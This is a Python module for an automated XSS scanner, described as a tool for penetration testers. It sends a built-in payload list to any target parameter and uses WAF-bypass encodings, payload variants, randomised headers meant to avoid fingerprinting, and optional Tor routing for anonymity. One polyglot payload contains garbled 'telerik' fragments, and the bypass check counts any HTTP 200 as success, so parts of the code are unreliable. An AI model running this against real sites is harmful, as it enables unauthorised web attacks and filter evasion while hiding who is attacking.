"""
XSS Scanner Module — Auto payload testing, WAF bypass chain,
payload variant generation, and reflection detection.
Defensive security testing tool for penetration testers.
"""
import asyncio
import random
import re
import html
import urllib.parse
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

import aiohttp

from core.debug_logger import logger


# ============================================================================
# PAYLOADS DATABASE
# ============================================================================

XSS_PAYLOADS = {
    'basic': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
    ],
    'attribute_breaker': [
        '" onmouseover=alert(1) "',
        "' onmouseover=alert(1) '",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='",
    ],
    'case_mixing': [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<ImG sRc=x oNeRrOr=alert(1)>',
        '<SvG oNlOaD=alert(1)>',
        '<BoDy OnLoAd=alert(1)>',
    ],
    'encoded': [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%3Cimg%20src=x%20onerror=alert(1)%3E',
        '%3Csvg%20onload=alert(1)%3E',
    ],
    'double_encoded': [
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '%253Cimg%2520src=x%2520onerror=alert(1)%253E',
    ],
    'no_script': [
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
    ],
    'js_context': [
        "';alert(1);//",
        '";alert(1);//',
        '-alert(1)-',
        '/alert(1)/',
        '\\";alert(1);//',
        "\\';alert(1);//",
    ],
    'css_context': [
        '</style><script>alert(1)</script>',
        'expression(alert(1))',
    ],
    'polyglot': [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0telerik0telerik11telerik//oNlOaD=alert()//><svg/oNlOaD=alert()//>",
        "'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert(1)>",
    ],
}


# ============================================================================
# USER-AGENT ROTATION
# ============================================================================

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
]


# ============================================================================
# BYPASS CHAIN TRANSFORMS
# ============================================================================

class BypassTransform:
    """WAF bypass transformation functions."""

    @staticmethod
    def replace_angles(payload: str) -> str:
        """Transform A: Replace < with %3C and > with %3E."""
        return payload.replace('<', '%3C').replace('>', '%3E')

    @staticmethod
    def add_null_byte(payload: str) -> str:
        """Transform B: Insert %00 after the first character."""
        if len(payload) < 2:
            return payload
        return payload[0] + '%00' + payload[1:]

    @staticmethod
    def double_encode(payload: str) -> str:
        """Transform C: Double URL encode everything."""
        first = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(first, safe='')

    @staticmethod
    def break_with_svg(payload: str) -> str:
        """Transform D: Break keywords with <svg> tags."""
        result = payload
        keywords = ['script', 'alert', 'onerror', 'onload', 'onfocus']
        for kw in keywords:
            if kw.lower() in result.lower():
                mid = len(kw) // 2
                broken = kw[:mid] + '<svg>' + kw[mid:]
                result = re.sub(re.escape(kw), broken, result, flags=re.IGNORECASE)
                break
        return result

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """Transform E: Convert < to &#60; and > to &#62;."""
        return payload.replace('<', '&#60;').replace('>', '&#62;').replace('"', '&#34;')

    @classmethod
    def all_transforms(cls) -> List[Tuple[str, callable]]:
        return [
            ('URL_ENCODE_ANGLES', cls.replace_angles),
            ('NULL_BYTE_INSERT', cls.add_null_byte),
            ('DOUBLE_ENCODE', cls.double_encode),
            ('SVG_TAG_BREAK', cls.break_with_svg),
            ('HTML_ENTITY', cls.html_entity_encode),
        ]


# ============================================================================
# VARIANT GENERATOR
# ============================================================================

class PayloadVariantGenerator:
    """Generate payload variants for bypass testing."""

    @staticmethod
    def case_swap(payload: str) -> str:
        """Variant 1: Randomize case of alphabetic characters."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def hex_encode_specials(payload: str) -> str:
        """Variant 2: Hex encode special characters only."""
        specials = '<>"\'&;()='
        return ''.join(
            f'\\x{ord(c):02x}' if c in specials else c
            for c in payload
        )

    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Variant 3: URL encode random characters, leave others raw."""
        result = []
        for c in payload:
            if c in '<>"\'&;' and random.random() > 0.4:
                result.append(urllib.parse.quote(c))
            elif c.isalpha() and random.random() > 0.7:
                result.append(urllib.parse.quote(c))
            else:
                result.append(c)
        return ''.join(result)

    @classmethod
    def generate_variants(cls, payload: str) -> List[Dict[str, str]]:
        return [
            {'type': 'CASE_SWAP', 'payload': cls.case_swap(payload)},
            {'type': 'HEX_SPECIALS', 'payload': cls.hex_encode_specials(payload)},
            {'type': 'MIXED_ENCODE', 'payload': cls.mixed_encoding(payload)},
        ]


# ============================================================================
# RESULT TYPES
# ============================================================================

class PayloadStatus(Enum):
    REFLECTED = "REFLECTED"
    BLOCKED = "BLOCKED"
    NOT_REFLECTED = "NOT_REFLECTED"
    ERROR = "ERROR"
    BYPASS_FOUND = "BYPASS_FOUND"


@dataclass
class PayloadResult:
    payload: str
    status: PayloadStatus
    http_status: int
    reflected: bool
    response_length: int = 0
    category: str = ''
    transform: str = ''
    variants_tested: int = 0


@dataclass
class BypassResult:
    original_payload: str
    winning_transform: str
    transformed_payload: str
    http_status: int


# ============================================================================
# XSS SCANNER
# ============================================================================

class XSSScanner:
    """Automated XSS payload scanner with bypass chain and variant generation."""

    def __init__(self):
        self.results: List[PayloadResult] = []
        self.bypass_results: List[BypassResult] = []
        self.running = False
        self.auto_chain_enabled = False
        self.use_tor = False
        self.delay = 3.0
        self.target_url = ''
        self.param_name = ''
        self.method = 'GET'
        self.cookies = ''
        self.headers_extra = ''
        self.total_tested = 0
        self.total_reflected = 0
        self.total_blocked = 0
        self.total_bypasses = 0
        self._broadcast = None

    def set_broadcast(self, broadcast_fn):
        self._broadcast = broadcast_fn

    async def _emit(self, event_type: str, data: Dict[str, Any]):
        if self._broadcast:
            await self._broadcast(event_type, data)

    def _random_headers(self) -> Dict[str, str]:
        """Generate randomized headers to avoid fingerprinting."""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                '*/*',
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.8',
                'en-US,en;q=0.5',
            ]),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'DNT': '1',
        }
        # Randomize header order by reconstructing
        items = list(headers.items())
        random.shuffle(items)
        return dict(items)

    async def _test_single_payload(
        self, session: aiohttp.ClientSession,
        url: str, param: str, payload: str,
        method: str = 'GET', cookies: str = ''
    ) -> PayloadResult:
        """Test a single XSS payload against the target."""
        try:
            headers = self._random_headers()
            if cookies:
                headers['Cookie'] = cookies

            if method.upper() == 'GET':
                sep = '&' if '?' in url else '?'
                test_url = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
                async with session.get(
                    test_url, headers=headers, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=15),
                    allow_redirects=True
                ) as resp:
                    status = resp.status
                    body = await resp.text(errors='replace')
            else:
                data_dict = {param: payload}
                async with session.post(
                    url, data=data_dict, headers=headers, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=15),
                    allow_redirects=True
                ) as resp:
                    status = resp.status
                    body = await resp.text(errors='replace')

            body_lower = body.lower()

            # Check if blocked by WAF
            if status in (403, 406, 429):
                return PayloadResult(
                    payload=payload,
                    status=PayloadStatus.BLOCKED,
                    http_status=status,
                    reflected=False,
                    response_length=len(body),
                )

            # Check reflection — does the payload appear in the response?
            reflected = False
            # Check raw payload
            if payload in body:
                reflected = True
            # Check decoded payload
            decoded = urllib.parse.unquote(payload)
            if decoded in body:
                reflected = True
            # Check HTML-decoded
            if html.unescape(payload) in body:
                reflected = True
            # Check case-insensitive
            if payload.lower() in body_lower:
                reflected = True

            return PayloadResult(
                payload=payload,
                status=PayloadStatus.REFLECTED if reflected else PayloadStatus.NOT_REFLECTED,
                http_status=status,
                reflected=reflected,
                response_length=len(body),
            )

        except Exception as e:
            return PayloadResult(
                payload=payload,
                status=PayloadStatus.ERROR,
                http_status=0,
                reflected=False,
            )

    async def attempt_bypass_chain(
        self, session: aiohttp.ClientSession,
        url: str, param: str, original_payload: str,
        method: str = 'GET', cookies: str = ''
    ) -> Optional[BypassResult]:
        """Try 5 bypass transforms on a blocked payload. Stop at first success."""
        for name, transform_fn in BypassTransform.all_transforms():
            if not self.running:
                break

            transformed = transform_fn(original_payload)
            if transformed == original_payload:
                continue

            await asyncio.sleep(self.delay * 0.5)

            result = await self._test_single_payload(
                session, url, param, transformed, method, cookies
            )

            await self._emit("xss_terminal", {
                "level": "info",
                "line": f"  [CHAIN] {name}: HTTP {result.http_status} — "
                        f"{'REFLECTED' if result.reflected else 'NOT REFLECTED' if result.http_status == 200 else 'BLOCKED'}"
            })

            if result.http_status == 200:
                bypass = BypassResult(
                    original_payload=original_payload,
                    winning_transform=name,
                    transformed_payload=transformed,
                    http_status=result.http_status,
                )
                self.bypass_results.append(bypass)
                self.total_bypasses += 1
                return bypass

        return None

    async def run_scan(
        self,
        url: str,
        param: str,
        method: str = 'GET',
        cookies: str = '',
        delay: float = 3.0,
        auto_chain: bool = False,
        use_tor: bool = False,
        categories: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """Run the full XSS scan with all payloads."""
        self.running = True
        self.target_url = url
        self.param_name = param
        self.method = method
        self.cookies = cookies
        self.delay = delay
        self.auto_chain_enabled = auto_chain
        self.use_tor = use_tor
        self.results = []
        self.bypass_results = []
        self.total_tested = 0
        self.total_reflected = 0
        self.total_blocked = 0
        self.total_bypasses = 0

        # Build payload list
        if categories:
            payloads_to_test = []
            for cat in categories:
                payloads_to_test.extend(
                    [(cat, p) for p in XSS_PAYLOADS.get(cat, [])]
                )
        else:
            payloads_to_test = [
                (cat, p)
                for cat, plist in XSS_PAYLOADS.items()
                for p in plist
            ]

        total = len(payloads_to_test)
        await self._emit("xss_terminal", {
            "level": "info",
            "line": f"[XSS] Starting scan — {total} payloads against {url} (param={param})"
        })
        await self._emit("xss_terminal", {
            "level": "info",
            "line": f"[XSS] Method={method}, Delay={delay}s, AutoChain={'ON' if auto_chain else 'OFF'}, Tor={'ON' if use_tor else 'OFF'}"
        })

        # Configure proxy for anonymity
        proxy = None
        if use_tor:
            proxy = 'socks5://127.0.0.1:9050'
            await self._emit("xss_terminal", {
                "level": "info",
                "line": "[ANON] Routing through Tor SOCKS5 proxy"
            })

        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            for idx, (category, payload) in enumerate(payloads_to_test):
                if not self.running:
                    await self._emit("xss_terminal", {
                        "level": "warning",
                        "line": "[XSS] Scan stopped by user"
                    })
                    break

                self.total_tested += 1

                result = await self._test_single_payload(
                    session, url, param, payload, method, cookies
                )
                result.category = category

                status_str = result.status.value
                if result.reflected:
                    self.total_reflected += 1
                    status_str = "REFLECTED"
                elif result.status == PayloadStatus.BLOCKED:
                    self.total_blocked += 1
                    status_str = "BLOCKED"

                self.results.append(result)

                await self._emit("xss_result", {
                    "index": idx + 1,
                    "total": total,
                    "payload": payload[:80],
                    "category": category,
                    "http_status": result.http_status,
                    "reflected": result.reflected,
                    "status": status_str,
                })

                await self._emit("xss_terminal", {
                    "level": "success" if result.reflected else "warning" if result.status == PayloadStatus.BLOCKED else "info",
                    "line": f"[{idx+1}/{total}] {status_str} | HTTP {result.http_status} | {category} | {payload[:60]}"
                })

                # Auto chain bypass for blocked payloads
                if auto_chain and result.status == PayloadStatus.BLOCKED:
                    await self._emit("xss_terminal", {
                        "level": "info",
                        "line": f"  [CHAIN] Attempting 5 bypass transforms..."
                    })
                    bypass = await self.attempt_bypass_chain(
                        session, url, param, payload, method, cookies
                    )
                    if bypass:
                        await self._emit("xss_bypass", {
                            "original": bypass.original_payload[:60],
                            "transform": bypass.winning_transform,
                            "transformed": bypass.transformed_payload[:80],
                            "http_status": bypass.http_status,
                        })
                        await self._emit("xss_terminal", {
                            "level": "success",
                            "line": f"  [BYPASS FOUND] {bypass.winning_transform} → HTTP {bypass.http_status}"
                        })

                await asyncio.sleep(delay)

        # Summary
        summary = self._build_summary()
        await self._emit("xss_summary", summary)
        await self._emit("xss_terminal", {
            "level": "info",
            "line": f"[XSS] Scan complete — {self.total_tested} tested, "
                    f"{self.total_reflected} reflected, {self.total_blocked} blocked, "
                    f"{self.total_bypasses} bypasses found"
        })

        self.running = False
        return summary

    async def generate_and_test_variants(
        self,
        url: str,
        param: str,
        payload: str,
        method: str = 'GET',
        cookies: str = '',
    ) -> List[Dict[str, Any]]:
        """Generate 3 variants of a payload and test them."""
        variants = PayloadVariantGenerator.generate_variants(payload)
        results = []

        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            for variant in variants:
                result = await self._test_single_payload(
                    session, url, param, variant['payload'], method, cookies
                )
                results.append({
                    'type': variant['type'],
                    'payload': variant['payload'],
                    'http_status': result.http_status,
                    'reflected': result.reflected,
                    'status': result.status.value,
                })
                await asyncio.sleep(self.delay * 0.5)

        return results

    def stop(self):
        self.running = False

    def _build_summary(self) -> Dict[str, Any]:
        reflected = [r for r in self.results if r.reflected]
        blocked = [r for r in self.results if r.status == PayloadStatus.BLOCKED]

        return {
            'target': self.target_url,
            'param': self.param_name,
            'method': self.method,
            'total_tested': self.total_tested,
            'total_reflected': self.total_reflected,
            'total_blocked': self.total_blocked,
            'total_bypasses': self.total_bypasses,
            'reflected_payloads': [
                {'payload': r.payload, 'category': r.category, 'http_status': r.http_status}
                for r in reflected
            ],
            'blocked_payloads': [
                {'payload': r.payload, 'category': r.category, 'http_status': r.http_status}
                for r in blocked
            ],
            'bypass_results': [
                {
                    'original': b.original_payload,
                    'transform': b.winning_transform,
                    'transformed': b.transformed_payload,
                    'http_status': b.http_status,
                }
                for b in self.bypass_results
            ],
            'auto_chain_used': self.auto_chain_enabled,
        }


xss_scanner = XSSScanner()
